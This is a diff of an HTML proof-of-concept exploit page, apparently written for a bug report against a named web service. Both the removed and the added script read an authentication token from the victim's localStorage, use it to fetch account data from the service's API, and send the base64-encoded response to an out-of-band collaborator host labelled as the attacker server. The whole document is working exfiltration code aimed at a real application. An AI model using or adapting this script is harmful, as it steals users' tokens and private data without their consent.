@@ -2,27 +2,27 @@
 <html>
   <body>
     <script>
-      async function steal() {
-        try {
-          // Target API endpoint that requires auth
-          let resp = await fetch("https://app.guidde.com/c/v1/spaces", {
-            method: "GET",
-            headers: {
-              "Authorization": localStorage.getItem("authToken") // or sessionStorage
-            },
-            credentials: "include" // in case it still uses cookies too
-          });
+      async function exploit() {
+        // Grab token from localStorage (if frontend stores it there)
+        let token = localStorage.getItem("authToken");  
 
-          let data = await resp.text();
-          
-          // Send stolen data to attacker server
-          await fetch("https://m9wwfmwclcldsfi462pa46fht8z4nvbk.oastify.com/log?data=" + btoa(data));
-        } catch(e) {
-          console.log("Exploit failed:", e);
+        if (!token) {
+          alert("No token found in localStorage. Exploit blocked.");
+          return;
         }
+
+        // Make authenticated request with victim’s token
+        let resp = await fetch("https://app.guidde.com/c/v1/spaces", {
+          headers: { "Authorization": "Bearer " + token }
+        });
+
+        let data = await resp.text();
+
+        // Send data to attacker server
+        await fetch("https://96dhvhp11yr5fzuvhiwjm8iz7qdh35tti.oastify.com/log?data=" + btoa(data));
       }
 
-      steal();
+      exploit();
     </script>
   </body>
 </html>
